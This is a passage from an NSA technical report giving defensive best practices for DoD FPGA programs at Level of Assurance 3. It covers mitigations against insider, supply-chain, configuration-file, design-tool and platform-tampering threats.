coordinate findings with JFAC.
Use a secret or classified network to protect from remote attack.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Descriptions
Assign roles
Employees should be assigned a specified role with associated accesses and privileges
based on the role. At a minimum, these roles should include design, test, network
administration and system administration. Roles should also be defined and
documented with no overlap. For example, the test engineer should not be the same
person who wrote the requirements to be tested. Users should not have multiple roles.
Note: In many real-world flows, designers and testers will require elevated privileges.
Some of these elevated privileges may be shared with system administrators. Some
may have names ("local admin," "root," etc.) that imply system administration. For
example, a member of the design team working on a software hardware interface may
require local administrative privileges to install and debug their work. A member of the
test team for an FPGA-based device connected to an IP network might require the
ability to configure multiple network devices in the test environment, as well as to
connect a computer in promiscuous mode to that same test environment. Those
accesses represent a part of the design or test role. However, these must be based on
the needs of the design or test process.
Elevated privileges on computers should be granted only as needed, and kept local to
specific computers. Elevated privileges should never include administrative access to
revision control servers, software installation, or other corporate infrastructure.
Elevated privileges on networks should be limited to distinct test networks, properly
isolated from the design environment and the corporate network.
Control and monitor access
Employees should only have access to areas, equipment, data, and information
necessary to meet the requirements of their assigned job. Entry/access to appropriate
areas should be recorded, monitored, and logged for auditability.
Research vulnerabilities
Software and tooling vulnerabilities can be exploited for nefarious purposes. The
program should actively monitor for vulnerabilities and perform risk assessment for any
software or tools selected. Platforms and tool vulnerabilities can be found in databases,
such as:
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Common Vulnerabilities and Exposures (CVE) 
 https://cve.mitre.org
National Vulnerabilities Database (NVD) 
 https://nvd.nist.gov
Government Industry Data Exchange Program (GIDEP) 
https://www.gidep.org/products/products.htm
DISA Security Technical Implementation Guides (STIGs) 
https://public.cyber.mil/stigs/
Searches for vendor advisories, publications, and academic papers detailing
vulnerabilities in the device in question.
Use a secret or classified network
Programs should select a network classified at the Defense Security Cooperation
Agency (DSCA) Secret level or above.
TD 3.6 Mitigating risk from a compromised employee
This scenario involves the compromise of an employee with access to the design, tools,
or network being used for design or test.
Mitigations
Enforce auditability of the requirements, architecture, design, code, tests, bugs,
and fixes.
Enforce the approved design process.
Identify, document, and review critical design activities. These items should be
reviewed by a cleared individual that is different than the original designer.
Use cleared personnel in an environment certified to handle classified material at
the Secret level or higher by DSCA. This also includes design centers certified
for Trust Category I by DMEA.
Note: For this threat, independent is defined as "not the originator." The reviewer can
be on the same team if necessary.
Descriptions
Enforce auditability
Enforce auditability of the requirements, architecture, design, code, tests, bugs, and
fixes. At a minimum, audit data includes what decisions were made, by whom, for what
reason, and on what date.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Enforce the approved design process
The design should include the identification of all assurance critical activities and
highlight how each will be reviewed. The design process should ensure the design is
reviewed by multiple cleared individuals. The original designer should not be the
responsible party for performing the review. The cleared reviewers should assess the
satisfaction of all requirements, ensure no extraneous design, and assess all
vulnerability activities, including identification of vulnerabilities and the appropriateness
of the mitigations. The design process should contain clear entry and exit criteria. Entry
and exit criteria should incorporate peer reviews and technical reviews with
management approval to exit a phase.
Review critical design activities
Ensure all critical activities are identified, documented, and the entire design is reviewed
by multiple cleared individuals other than the original designer. Reviewers should
assess all critical activities. Specific considerations include:
Design source files in conjunction with behavioral simulations
Design synthesis in conjunction with functional verification
Design implementation in conjunction with static timing analysis
Bitstream generation with reproducible build results
Programming in conjunction with in-circuit verification
Ensure that the review teams do not include the original designers and each reviewer
should hold a U.S. Secret security clearance.
Use cleared personnel
Use personnel with at least a Secret level clearance to perform designated work.
TD 3.7 Mitigating risk associated with the compromise of device
identifiers
It is imperative to protect the device IDs, ensuring adversaries are not able to utilize this
information to track devices, swap counterfeits into the stores, or manipulate device
controls.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Mitigations
Store device identifiers in a protected area utilizing access control. This should
include physical or logical separation, and could be a safe, a classified network,
or a sensitive compartmented information facility (SCIF).
Limit access to device identifier information to those that need it for completion of
job responsibilities.
Descriptions
Store device identifiers
Store devices in a protected area utilizing access control. This should include physical
or logical separation, and could be a safe, a classified network, or a SCIF.
Limit access to device identifier information
Limit device identifier information to those that need it for completion of job
responsibilities.
TD 4: Adversary compromises system assembly, keying, or
provisioning
In this threat, an adversary has carried out an attack on the system during printed circuit
board (PCB) assembly, key injection, or flash provisioning. This attack could include the
assembly house acquiring counterfeit parts on behalf of the end customer, swapping out
authentic FPGA parts for counterfeit ones, stealing or compromising configuration data,
or stealing or modifying keys. Multiple parties can be involved during the system
assembly phase. The following areas of the supply chain are included in this threat:
Shipping devices to the PCB assembly facility.
Transmitting keys, configuration data and FPGA part numbers to the assembly
facility.
Injecting keys into the FPGA devices.
Provisioning the configuration storage devices.
Attaching the FPGA devices to the PCB.
Testing PCBs.
Shipping the PCBs to the next manufacturing stage.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Of particular concern in this attack is the assumed existence of one or more cleared
insiders working maliciously in some portion of this manufacturing process. At LoA3,
this insider could be working alone or in partnership with an external party to influence
the outcome. Additionally, in LoA3, attacks can also result in reliability or performance
degradation. The following mitigations are built to address these premises:
All assembly work requires after-the-fact validation by the program validation team
in a cleared facility.
The assembly work should be conducted in a facility minimally classified as
Secret. The post-fab validation should be done by a verification team with Secret
clearance and independent of those who conducted the assembly work. The
duplication is necessary as cleared insiders working in conjunction can
compromise the device and the validation process. The use of multiple cleared
teams helps to reduce the risk of that scenario.
It is recommended that all mitigation steps be performed in a classified facility.
TD 4 mitigations
Regardless of where the work is performed, the program should implement the following
list of mitigations in the assembly, keying, and provisioning process:
Purchase from DoD authorized vendors and distributors. The DoD program
acquisition group can provide this information.
Follow storage and shipping guidance when storing or transferring FPGA devices
between locations.
Provide keys and configuration data to the provisioning house in digitally signed
packages and with hashes.
Prior to provisioning, clear memory devices that store configuration data.
Provision private keys into the FPGA devices in a DSCA Classified Secret or
Trust Category I certified facility after the assembly process.
Protect the configuration data package by sending it separately to the assembly
house and the validation team.
Following assembly and provisioning, perform verification activities in a DSCA
Classified Secret or Trust Category I certified facility.
*Authenticate the FPGA device after being out of the control of the program.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 4 mitigation descriptions
Purchase from DoD authorized vendors and distributors
Use DoD authorized vendors for all purchases. Authorized vendors can be located
through the acquisition organization.
Follow storage and shipping guidance
All devices should be verified upon receipt. Once verification has taken place,
production devices should be stored and maintained in a restricted area separate from
non-production devices (design, test, etc.). Production devices should be continuously
tracked to include arrival of the device by unique identifier, interaction anyone has with
the device, and exit of the device from inventory. The restricted area should enforce
access control that limits access to only a minimum subset of people that require
access to support direct job responsibilities and excludes all members of the design
team. The restricted area should have a clearly defined perimeter, but physical barriers
are not required. Personnel within the area are responsible for challenging all persons
who may lack appropriate access authority. The restricted area access should be
audited to include data containing who entered/exited the area with a timestamp and
reason for entry.
Shipping should be controlled and managed. JFAC recommends shipping material
using a commercial carrier that has been approved by the CSA to transport Secret
shipments, although the material is not Secret. Commercial carriers may be used only
within and between the 48 contiguous States and the District of Columbia or wholly
within Alaska, Hawaii, Puerto Rico, or a U.S. possession or trust territory. When
shipping using a commercial carrier take efforts to afford additional protection against
pilferage, theft, and compromise as follows. This includes using hardened containers
unless specifically authorized otherwise and ensuring the packages are sealed. The
seals should be numbered and the numbers indicated on all copies of the bill of lading
(BL). When seals are used, the BL shall be annotated substantially as follows: DO NOT
BREAK SEALS EXCEPT IN CASE OF EMERGENCY OR UPON PRIOR AUTHORITY
OF THE CONSIGNOR OR CONSIGNEE. IF FOUND BROKEN OR IF BROKEN FOR
EMERGENCY REASONS, APPLY CARRIER'S SEALS AS SOON AS POSSIBLE AND
IMMEDIATELY NOTIFY BOTH THE CONSIGNOR AND THE CONSIGNEE.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Provide keys and configuration data
Provide keys and configuration data to the provisioning house in digitally signed
packages and with hashes. JFAC recommends that these data packages be encrypted
using the Advanced Encryption Standard (AES) algorithm with a key of at least 256-bit
length. The assembly house should utilize the signature and hash to verify the integrity
of the contents.
Clear memory devices
Prior to provisioning, clear memory devices that store configuration data. This prevents
an adversary from storing malicious configuration data in non-used areas of the memory
device. These memory devices could include a discrete PCB component like a Flash or
the on-chip FPGA non-volatile storage available on certain devices.
Provision private keys
Provision private keys into the FPGA devices in a DSCA Classified Secret or Trust
Category I certified facility after the assembly process.
Protect the configuration data package
The program should ensure there are processes and procedures in place to ensure that
the configuration data package is provided to the assembly house and the validation
team in a manner that cannot be corrupted by a single individual. The data should be
provided directly and independently to each destination. The assembly house should
not be used to pass the data to the test facility. Ensure there is a golden copy provided
to each functional area ensuring the same data is transmitted.
Perform verification activities
Following assembly and provisioning, perform all verification activities in a DSCA
Classified Secret or Trust Category I certified facility.
At LoA3, there can be multiple compromised cleared insiders. To mitigate this threat, a
team of people cleared at the Secret level and independent from the assembly and
provisioning team should be utilized to conduct the validation.
Those performing this validation must:
Verify the PCB traces related to the FPGA device, the configuration memory
devices, and any other devices related to the authentication of the configuration
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
data. If needed, the program should rely on guidance from the JFAC PCB
Executive Agent to perform this verification.
Verify the authenticity of the configuration data loaded on the FPGA memory
device following provisioning and assembly. The verification can be executed by
a bit comparison or a hash. This verification must be performed by a team
independent of the assembly and provisioning process. The verification should
cover the entire contents of the memory device and not just the addresses
containing the configuration data. It is recommended to program the entire
memory space to disallow unused memory for nefarious purposes.
Verify that the FPGA system can cryptographically authenticate all loaded
configuration data as part of the system containing the FPGA upon load. The
authentication methodology should verify both the source and contents.
Verify that the proper post assembly keys have been loaded into the FPGA key
storage elements. This verification must be performed by a team independent of
the assembly and provisioning process. Some FPGA devices allow a hash of the
keys to be read out for confirmation. Additionally, the program should create test
bitstreams to verify that the devices can properly utilize the keys and can reject
actions using wrong keys.
Verify the authenticity of the FPGA device to rule out the introduction of a
counterfeit part during assembly.
Authenticate the FPGA device
When the FPGA has been out of positive control of the program it must be
authenticated. The program should select one of the options below:
Option 1: Verify the device on the PCB is an authentic and authorized device by
validating that each device has a unique cryptographic ID signed by the vendor. Each
device must contain a unique private asymmetric key for which no read function exists,
and validation must involve the device signing a nonce. A NIST approved asymmetric
authentication algorithm must be used for this. The program should authenticate the
FPGA devices utilizing this ID when they have been out of the positive control of the
program.
Option 2: Verify the device on the PCB is an authentic and authorized device by
performing physical counterfeit inspection with destructive sampling as described under
Perform physical inspection/analysis. This is primarily an SAE International AS6171
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Test Methods Standard; General Requirements, Suspect/Counterfeit, Electrical,
Electronic and Electromechanical Parts based evaluation, with requirements to obtain
vendor information.
Option 3: Use a soft PUF. Verify the device on the PCB is an authentic and authorized
device by utilizing a soft PUF to create unique IDs. The soft PUF is used to validate the
integrity of the devices when they are outside of the program's control. The program
should generate these IDs when FPGAs are in their control by loading the soft PUF into
the FPGA fabric, use it to generate a unique ID for the respective device, and then
delete the PUF. Following assembly, the program should repeat this process and
ensure the ID matches, authenticating the device. If the soft PUF will be used to
authenticate the device when it is outside the program control, it is recommended that
the following be done:
Prevent readout of the PUF output to the FPGA
s external pins.
Utilize the PUF to encrypt a nonce that can transmit outside the device.
Utilize a public key based on the PUF value to decrypt the nonce and
authenticate the device.
This approach can be used to support remote attestation when needed.
TD 5: Adversary compromises third-party soft IP
In this threat, an adversary compromises third-party soft IP intended for integration into
the configuration of the FPGA. The compromise can occur during the IP
s development
cycle, during its delivery, or while it is at rest at the program
s design center. In all
scenarios, the compromised IP contains a malicious function that was inserted during its
design and can be triggered through some input to the FPGA, or when a specific
scenario occurs. In all cases, it is important to remember the purpose of the Trojan is
unknown, but probable impacts include functional change, performance, power, or
reliability. The mitigations to these attacks focus on verifying integrity of the delivery of
the IP and reviews of its HDL code.
See Appendix B: IP Reuse Guidance for information describing parameters for reusing
internally created or previously evaluated IP.
TD 5 mitigations
Purchase from DoD authorized vendors and distributors.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Only accept IP that is unobfuscated and distributed as source code.
Ensure IP deliverable packages are digitally signed.
Validate the cryptographic hash of the IP against the hash signed by the vendor.
Store IP in a revision control repository immediately upon receipt with the hashes
used to authenticate the contents. Protection of the hash will allow for reverification of the IP at a later date.
*Examine IP for malicious functions.
TD 5 mitigation descriptions
Purchase from DoD authorized vendors and distributors
Use DoD authorized vendors and distributors for all purchases. Authorized vendors can
be identified through the acquisition organization.
Only accept IP that is unobfuscated
Only accept IP that is unencrypted, unobfuscated, and distributed as source code. IP
must be human readable for review.
Ensure IP deliverable packages are digitally signed
The program should only accept digital signature certificates validated by reputable third
parties. The program should be limited to publicly released software and not special or
custom distributions of the software. The program should maintain documentation of the
vendor provided signature and hash, and the actual software hash.
Validate the cryptographic hash
Ensure that the cryptographic hash of the IP is validated against the hash signed by the
vendor. All parts of the software delivery should be authenticated in this manner
including 
install
 macros and other support functions. The program should only accept
certificates validated by reputable third parties. The program should be limited to
publicly released software. The program should maintain documentation of the source
of the hash and the actual software hash.
Store IP in a revision control repository
Immediately upon receipt, the IP with its associated hash should be checked into a
version control repository. The hash of the IP should be verified at various stages to
ensure there have been no modifications. The hash should be stored separately from
the IP block and be made read-only to the development team.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Examine IP for malicious functions
To examine the IP for malicious functions, choose one of the following options:
Option 1: Have two cleared personnel review the IP, according to the JFAC guidance in
Third-Party IP Review for Level of Assurance 3. JFAC can provide this document upon
request.
Option 2: Contact JFAC to determine if an IP review of the complete IP package has
been previously completed. If JFAC has not performed an IP review, option 1 must be
selected.
TD 6: Adversary swaps configuration file on target
In this threat, an adversary obtains access to the system during or after assembly and
can compromise the FPGA device
s operation via a modification to the configuration
data.
For assurance purposes, these guidelines are not concerned with the exposure of the
configuration data or the confidentiality of the public keys, as they do not compromise
the authentication of the data. However, programs with security requirements may need
to protect this information and can choose to implement additional protections.
Technological mitigations exist publicly for this threat such as configuration data
authentication. Mitigations must involve authenticating the configuration file for both
integrity and provenance. JFAC encourages programs to use device families that
support configuration data authentication.
Programs are discouraged from using devices that do not support configuration data
authentication. In this scenario, authentication practices apply to all configuration file
loads, including local loads, remote updates, multi-boot scenarios, configuration via
software, and configuration via protocol where the configuration file is loaded into the
FPGA. For devices that store the data internally in non-volatile memory (NVM), this
requirement only applies to the initial loading.
As of October 2022, all the major U.S. FPGA vendors provide built-in functionality to
authenticate configuration files either at load into internal memory or at configuration for
at least one device family. The specifics of this authentication vary greatly. The exact
details of key management and storage vary from device to device. Some offer facilities
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
to store many authentication keys, some use fuses, and others use independently
powered random access memory (RAM). Further, there are public techniques to subvert
the authentication, which have complex implications for the security of built-in
authentication1.
The result is that the exact security of each method is not apparent without a detailed
evaluation. This report communicates the specific mechanisms that meet JFAC
expectations, as well as caveats for their use. As a rule, the program must use CNSS or
NIST approved asymmetric cryptographic algorithms at LoA3.
To achieve LoA3, all boot/configuration images must be authenticated with respect to
their source and data integrity. That is, the device must validate that the file comes from
an authorized provider and that the data has not been modified prior to loading. For
LoA3, the recommended method for authenticating the data source is to use an
asymmetric algorithm recommended by CNSS or NIST. Asymmetric algorithms are
preferred because they do not require the protection of a secret key. For data integrity,
a hashing algorithm, such as secure hashing algorithm (SHA), is recommended. Many
of the existing FPGA devices provide these functions for the user.
TD 6 mitigations
These are the configuration file threat mitigations:
Incorporate cryptographic authentication of all loaded configuration data as part
of the system containing the FPGA.
Design the system to authenticate configuration data each time the data is
loaded into the FPGA device.
Configure all production devices in a way that prevents direct read back of the
private keys through electrical means.
Use a CNSS/NIST approved algorithm and key length.
Use DoD evaluated authentication mechanisms.
Disable test access pins in fielded products.
*When the program utilizes mechanisms that allow application updates, ensure
authentication for modifications is supported
1 The Unpatchable Silicon: A Full Break of the Bitstream Encryption of Xilinx 7-Series FPGAs. Usenix Security 
20. Maik Ender, Amir Moradi, Christof Paar.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Generate and store all authentication keys on a program controlled, FIPS 140-2
compliant, Level 2 hardware security module (HSM)
TD 6 mitigation descriptions
Incorporate cryptographic authentication
The program should enforce cryptographic authentication of the configuration file. In
addition, the program should maintain documentation including the authentication
methodology, its architecture, and its compliance with appropriate CNNS Policy if the
project is identified as a National Security System. Otherwise, ensure compliance with
appropriate NIST standards.
Authenticate configuration data each time the data is loaded
Design the system to authenticate configuration data each time the data is loaded into
the FPGA device.
Prevent direct read back
Configure all production devices in a way that prevents direct read back of the private
keys through electrical means.
Use a CNSS/NIST approved algorithm and key length
If the project is identified as an NSS, use a CNSS Policy approved algorithm and key
length. Otherwise use a NIST approved algorithm and key length, as described in the
latest approved version of FIPS 186, Digital Signature Standard, or FIPS 198, The
Keyed-Hash Message Authentication Code (HMAC).
Use DoD evaluated authentication mechanisms
The program can either select an authentication mechanism with an existing evaluation
or sponsor the evaluation itself. JFAC can perform evaluations and maintains best
practices in using commercial technology for this purpose.
At a minimum, any evaluation must:
Ensure compliance with the current version of FIPS 186, Digital Signature
Standard.
Authenticate all boot configuration data.
Confirm its ability to verify data integrity using positive and negative testing.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Confirm its ability to verify the authorized source using positive and negative
testing.
Ensure authentication is applied to all configuration data regardless of how it is
stored or delivered prior to or in parallel to configuration.
Verify the authentication mechanisms do not contain any known vulnerabilities.
All keys must be generated and protected in accordance with FIPS 140-2 Level
The use and operation of application test access is disabled in fielded products.
Disable test access pins
All modern FPGA family devices have hardware test interfaces to support fabrication
testing of the device and testing of the user product. These interfaces usually include
Joint Test Action Group (JTAG) pins and dedicated test pins.
JTAG pins should be disabled in fielded products. It is a common practice to disable
these access points prior to fielding the device. JFAC recommends disabling this in nonvolatile fuses when available.
Ensure authentication for modifications
Many FPGA platforms contain mechanisms that allow the application to change or
update itself. Some allow for true in-flight reprogramming, where some portion of the
FPGA continues normal operation while another portion changes its behavior. Others
allow for reprogramming via external storage. Ensure that the built-in application change
technique applies authentication to all the reconfiguration data.
The names of these operations are system specific and include terms like 
dynamic
reconfiguration,
partial reconfiguration,
in-application programming,
 etc. In practice,
most FPGA device families do not provide the same degree of authentication that the
primary programming mechanisms provide.
Authenticating reconfiguration data in the application itself
In this case, the program incorporates functions in the application to perform
authentication on configuration data when the FPGA device cannot. When utilizing this
option, the program should pay attention to the following considerations.
2 FIPS 140-2 will be replaced at a future date with FIPS 140-3.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
System-on-chip FPGAs (SoC FPGAs) incorporate central processing units (CPUs) as a
component of a reconfigurable platform. The JFAC FPGA Best Practices do not seek to
provide software assurance to the application running in the CPUs of a SoC FPGA.
However, the best practices listed here will provide the same degree of assurance to
the initial user code (sometimes called a bootloader) executed by the CPU.
From there, it is possible for a designer to extend the same authenticity to the user code
if their system requires it. In cases where the program uses an interface between the
FPGA fabric and the SoC in order to have one function load the other, it is vital that no
path exists from this interface to the input/output (I/O). It is up to the program to ensure
that only the application has access to it.
In some platforms, security settings can be programmed into both non-volatile storage
in the device itself and as a setting in the configuration file loaded into the device.
Settings should always be programmed in the non-volatile storage of the device. In
those cases where use of security settings within the configuration file is acceptable, it
must be explicitly noted.
Some platforms provide support for remotely updating the boot or configuration data on
the FPGA device. This update is sent via a network, stored locally on the FPGA device,
and then loaded into the device by the application.
An application designer using these operations should implement one of the following
two options:
Option 1: Validate that the built-in application change technique being used fully applies
authentication to all the reconfiguration data.
Option 2: Perform authentication of the reconfiguration data in the application itself.
Many platforms support the ability to load different boot or configuration files from a
local memory. This methodology involves the current application instructing the device
to point to a new memory location for the boot/configuration information. In these cases,
the device maintains a pointer to the original data if there is a load error with new file. It
is necessary to ensure that all boot/configurations can be authenticated with respect to
its source and data integrity in the same manner as the base load. Many devices leave
this task to the application to perform.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Use a FIPS 140-2 compliant, Level 2 HSM
Generate and store all authentication keys on a program controlled, FIPS 140-2
compliant, Level 2 HSM with the HSM configured to enforce role-based restrictions on
the use of the keys. Maintain an approved list of individuals who can access the keys.
It is worth noting that there are additional protections that can be applied to the FPGA
configuration data when its fielded location is physically unguarded. These include:
Configuration file encryption using a NIST or DoD approved algorithm.
The use of split decryption keys to make key theft more difficult. This involves
storing multiple keys throughout the system, concatenating them, and then using
the hash of the concatenation as the decryption key.
The use of PUFs for key generation or a combination of PUF output and stored
key.
Utilize any additional key protection mechanisms provided by the vendors.
Utilize good physical access protections for the PCB.
TD 7: Adversary substitutes modified FPGA software design
suite
In this threat, an adversary replaces the design suite an application designer uses with
one modified to subvert the application during synthesis, place and route, or
configuration data generation. In this threat, the adversary would have access to a
modified version of commercial vendor software and would use the modified software
Subvert the security features of an FPGA during configuration data generation.
Insert a malicious function into the device during synthesis, place and route or
configuration data generation.
Insert a data leak or backdoor into the synthesized device during synthesis, place
and route, or configuration data generation.
This subverted tool would then be entered into the program
s design environment by a
vendor insider, an adversary-in-the-middle technique, or through a network intrusion.
This threat does not include the scenario where an FPGA vendor insider modifies the
authorized software during development for malicious purposes, which is covered by TD
10: Adversary modifies vendor FPGA software design suite during development.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 7 mitigations
Purchase from DoD authorized vendors and distributors. Both DoD and vendors
have recommendations for the appropriate distributors of products. The DoD
program acquisition group can provide this information.
Prevent automatic tool updates by using an installation and update process that
does not require Internet connectivity.
Install and execute software using a trusted computing environment to protect
from remote intrusions.
Use cleared personnel with at least a Secret level clearance.
Validate the cryptographic hash of the software against the hash signed by the
vendor.
*Validate the tool output has not modified the source design.
TD 7 mitigation descriptions
Purchase from DoD authorized vendors and distributors
Use DoD authorized vendors for all purchases. Authorized vendors can be identified
through the acquisition organization.
Prevent automatic tool updates
Prevent automatic tool updates by using an installation and update process that does
not require Internet connectivity.
Use a trusted computing environment
Programs should select one of the trusted computing environment options below, to
protect from remote attack.
Option 1: A computer and network classified at the DSCA Secret level or above.
Option 2: A computer and network certified for use in a Trust Category 1 facility as
defined by DMEA.
Option 3: A network-isolated computer enclave with limited and controlled access
adhering to NIST and CMMC standards. This is a computer with the vendor software
installed by a network administrator. This administrator should not be a designer
working on the application design.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Use cleared personnel
Use personnel with at least a Secret level clearance to perform designated work.
Validate the cryptographic hash
Ensure the cryptographic hash of the software deliverables is validated against the hash
signed by the vendor. All parts of the software delivery should be authenticated in this
manner including 
install
 macros and other support functions. The program should only
accept digital signature certificates validated by reputable third parties. The program
should be limited to publicly released software and not special or custom distributions of
the software. The program should maintain documentation of the vendor provided
signature and hash, and the actual software hash.
Validate the tool output
Validate the tool has not inserted any Trojan by choosing one of the following options:
Option 1: Perform logical equivalency checking between the application HDL and the
final configuration data. This effort should attempt to verify that the final bitstream and
originating application HDL are logically equivalent with no extraneous logic in the final
format. This action will confirm that no Trojans were inserted during the implementation
steps.
Option 2: Use a reproducible build process to validate the software.
When using reproducible builds to validate software, enlist a third party to mirror the
FPGA
s synthesis, place and route, and configuration file generation. If the mirroring is
executed properly and independently, the outputs can be compared to verify that the
vendor software package is unmodified or modified in a way that does not affect the
application design. To ensure proper execution of this mitigation, the following must be
observed:
The software used to mirror the program
s synthesis effort must be procured in a
manner to make it independent from the procurement of the original version.
The reproducible build software should be loaded/installed by a different
administrator than the administrator that performed the original install.
This mitigation requires independent duplicative activities since the adversary
could have knowledge about the project and how it obtains, loads, and controls
its tools.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
The mirrored effort should utilize the same version of the software on the same
operating system and version.
The application development team
s software and the mirroring software should
possess matching hashes and size values.
The mirrored effort must utilize the same HDL code, IP and synthesis scripts.
The mirrored effort must utilize the same vendor tool settings.
The output of the effort is an unencrypted, uncompressed configuration data file.
Contact the FPGA software vendor for more detailed guidance on creating reproducible
builds. They have already performed work in this area and can assist with documented
instructions.
Both the development effort and the mirror effort should execute the FPGA
development flow from synthesis to configuration file output and then perform the
following steps:
Throughout the flow, output any intermediary files that can be used to compare
results at various stages. This can include primitive netlists, synthesized netlists,
physical netlists, and final configuration data files.
Compare the final configuration files for size and content. They should match in
all respects except for header information that may include timestamps and other
property information.
If the files are encrypted, take steps to ensure that any nonces, such as the
initialization vector, used by both efforts are the same.
If discrepancies are found in the comparison, the following steps should be followed:
Contact the software vendors for assistance.
Contact JFAC for assistance in resolving the discrepancy.
If a software version does not match what was expected, JFAC recommends reporting it
to the vendor for further analysis and correction.
TD 8: Adversary modifies FPGA platform family at design
In this threat, an adversary inserts a malicious function or preplaces a vulnerability for
later use in an FPGA device during its hardware design phase. This attack involves a
network intrusion or a compromised insider working for the vendor or one of its
subcontractors. While this attack lacks the ability to target an individual program, it can
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
preposition a vulnerability for later use. Evaluation of manufactured hardware for built-in
malicious functions or vulnerabilities is a very difficult, highly expensive, and near
impossible task. As such, no practical amount of evaluation can guarantee the absence
of any designed-in malicious function.
TD 8 mitigations
Engage JFAC to evaluate the FPGA device family.
TD 8 mitigation description
Engage JFAC
JFAC recommends the program engage JFAC to evaluate the chosen FPGA device
family or to acquire information garnered from previous evaluations. JFAC will then
instruct the program on what steps to take to identify malicious code or weaknesses in
their FPGA platform. Initially, the program may be asked to conduct a subset of the
evaluation steps in partnership with JFAC. In parallel, JFAC may evaluate the FPGA
device family for malicious behavior and operational weaknesses. In addition, JFAC has
been evaluating commonly used FPGA device families proactively.
In support of this mitigation, JFAC asks all programs seeking LoA compliance at any
level to provide JFAC with information regarding the FPGA devices they are using along
with a brief summary of their use. This information will be compiled to create a picture of
which FPGAs are of greatest interest to DoD and which ones might represent a
vulnerability to multiple programs. This information will drive the decision-making behind
which device families to proactively analyze for vulnerabilities.
JFAC communicates this information at a variety of classification levels. Please contact
JFAC to obtain the appropriate email address at https://jfac.navy.mil.
Refer to Appendix C: JFAC FPGA reporting template for the information a program
should include in the email.
As evaluations are completed, JFAC will document the findings for programs to use in
their vulnerability research.
Finally, JFAC recommends that programs utilize newer and more modern device
families when possible. These families possess more mature design architectures that
encompass vulnerability fixes and advanced assurance features.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 9: Adversary compromises single-board computing
system (SBCS)
In this threat, an adversary compromises a single-board computing system (SBCS)
purchased by a program for use in a system. An SBCS is a commercial off-the-shelf
product consisting of a PCB with FPGAs and computer processing resources. These
boards are common throughout DoD systems as they are readily available in the
marketplace. Under this threat, the program does not have control of the manufacturing
process of the SBCS, forcing the program to rely upon a verification heavy approach to
mitigating attacks. In this light, programs should work with existing DoD providers to
build custom SBCS devices in compliance with LoA3 guidelines.
Of primary concern in this scenario are threats to:
Authenticity of the FPGA devices
PCB connections to the FPGA
The configuration methodology
Test interfaces
The following mitigations only address the hardware assurance concerns related to the
manufacturing and operation of the FPGA device and do not consider other
components of the SBCS.
TD 9 mitigations
Programs should engage a DoD vendor to build the SBCS devices under the
LoA3 constraints. This includes the use of cleared people and classified facilities,
minimally at the Secret level.
All verification and authentication steps in this section should be conducted by a
team of people independent from the manufacturing team.
Authenticate the FPGA devices.
Verify the SBCS configuration process and that the board-level connections
comply with the LoA3 mitigation requirements.
Document the steps taken to comply with these requirements. This includes
hardware and software features.
Test nonvolatile memory verifying there are no conflicting prepopulated settings.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 9 mitigation descriptions
